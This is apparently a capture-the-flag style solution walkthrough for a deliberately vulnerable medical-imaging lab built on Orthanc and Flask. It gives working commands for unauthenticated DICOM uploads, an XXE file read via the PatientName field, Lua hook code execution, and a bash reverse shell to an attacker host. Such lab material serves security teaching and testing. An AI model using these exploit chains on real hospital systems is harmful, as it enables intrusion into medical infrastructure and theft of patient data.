# MediTech Vulnerable Lab — Solution Walkthrough

---

## Step 1 — Confirm the Attack Surface

Run a quick port scan to confirm the three services are live.

```bash
nmap -sV -p 4242,5000,8042 <TARGET_IP>
```

Confirm Orthanc is accepting unauthenticated REST calls:

```bash
curl http://<TARGET_IP>:8042/system
```

A JSON response with no 401 confirms that `AuthenticationEnabled` is off. Open `http://<TARGET_IP>:5000` and `http://<TARGET_IP>:8042` in a browser to see both the Flask dashboard and the Orthanc web viewer load with no login prompt.

---

## Step 2 — Unauthenticated DICOM C-STORE

Generate a benign DICOM file and push it directly to Orthanc without credentials.

```bash
cd scripts
python3 generate_dicom.py -o legit.dcm
storescu -v <TARGET_IP> 4242 legit.dcm
```

Verify it was accepted:

```bash
curl http://<TARGET_IP>:8042/instances
```

The instance UID returned confirms that any attacker on the network can store arbitrary DICOM files with no authentication. This is also the trigger mechanism for the Lua RCE in Step 4.

---

## Step 3 — XXE File Read via DICOM Upload

Generate a malicious DICOM with an XXE payload in the PatientName field targeting `/etc/hostname` first as a proof of concept.

```bash
python3 generate_malicious_dicom.py -t /etc/hostname -o malicious.dcm
```

Upload it to the Flask dashboard:

```bash
curl -s -F "dicom_file=@malicious.dcm" http://<TARGET_IP>:5000/upload
```

The container hostname appears in the PatientName field on the response page. The vulnerability works because `dcmdump` writes the PatientName value verbatim into XML, and the Flask app parses that XML with `lxml` configured as `resolve_entities=True`, causing the `file://` entity to be read from disk.

Now read the actual flag:

```bash
python3 generate_malicious_dicom.py -t /root/flag.txt -o read_flag.dcm
curl -s -F "dicom_file=@read_flag.dcm" http://<TARGET_IP>:5000/upload | grep -A2 "patient-name"
```

The flag value is injected into the PatientName field and printed on the view page. The Flask app runs as root, so it can read the root-owned `flag.txt` directly.

---

## Step 4 — Lua Remote Code Execution

Upload the pre-written Lua hook to the unauthenticated admin panel. The hook uses `os.execute()` which works because `LuaSandbox` is set to `false` in the Orthanc config.

```bash
curl -s -F "lua_file=@../scripts/rce_hook.lua" \
  http://<TARGET_IP>:5000/admin/lua -L
```

Trigger the hook by sending any DICOM file via C-STORE:

```bash
storescu -v <TARGET_IP> 4242 legit.dcm
```

Orthanc fires `OnStoredInstance`, which calls `os.execute()` and writes command output to `/tmp/rce_proof.txt`. Verify it:

```bash
docker exec meditech-orthanc cat /tmp/rce_proof.txt
```

The output will show `uid=0(root)`, confirming OS-level code execution inside the Orthanc container.

To escalate to an interactive shell, upload a modified hook targeting your listener:

```lua
function OnStoredInstance(instanceId, tags, metadata, origin)
  os.execute("bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' &")
end
```

Start the listener, then trigger another C-STORE:

```bash
nc -lvnp 4444
storescu -v <TARGET_IP> 4242 legit.dcm
```

---

## Step 5 — Automated Validation

Run the full exploit chain test suite to confirm all three paths work:

```bash
pip install pydicom requests
python3 tests/test_exploit_chain.py \
  --base-url http://<TARGET_IP>:5000 \
  --orthanc-url http://<TARGET_IP>:8042
```

All four tests should pass: legit upload baseline, XXE file read, Lua script upload, and Orthanc unauthenticated access.

